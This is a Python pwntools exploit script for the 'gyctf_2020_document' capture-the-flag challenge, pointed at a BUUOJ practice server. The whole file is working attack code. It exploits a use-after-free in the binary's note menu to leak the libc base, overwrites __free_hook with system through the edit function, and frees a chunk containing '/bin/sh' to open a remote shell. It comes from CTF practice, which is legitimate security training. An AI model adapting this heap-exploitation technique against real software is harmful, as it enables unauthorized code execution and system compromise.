#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/09 19:44:00
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('./gyctf_2020_document')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 26017
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('./gyctf_2020_document')


def cmd(choice):
    sh.recvuntil("Give me your choice : \n")
    sh.sendline(str(choice))

def add(name,sex,content):
    cmd(1)
    sh.recvuntil("input name\n")
    sh.send(name)
    sh.recvuntil("input sex\n")
    sh.send(sex)
    sh.recvuntil("input information")
    sh.send(content)

def show(idx):
    cmd(2)
    sh.recvuntil("Give me your index : \n")
    sh.sendline(str(idx))

def edit(idx,content):
    cmd(3)
    sh.recvuntil("Give me your index : \n")
    sh.sendline(str(idx))
    sh.recvuntil("Are you sure change sex?\n")
    sh.sendline("N")
    sh.recvuntil("Now change information\n")
    sh.send(content)

def dele(idx):
    cmd(4)
    sh.recvuntil("Give me your index : \n")
    sh.sendline(str(idx))
name = 'a' * 8
sex = 'a' * 8
add(name,sex,"a"*0x70)
add('/bin/sh\x00',sex,'a' * 0x70)
dele(0)
show(0)
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b78
log.info("Success leak libc_base:0x%x"%libc_base)
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
add(name,sex,'a' * 0x70)
add(name,sex,'a' * 0x70)
edit(0,p64(0) + p64(0x21) + p64(free_hook-0x10) + 'a' * 0x58)
edit(3,p64(system_addr) + 'a' * 0x68)
dele(1)

# gdb.attach(sh)
# pause()
sh.interactive()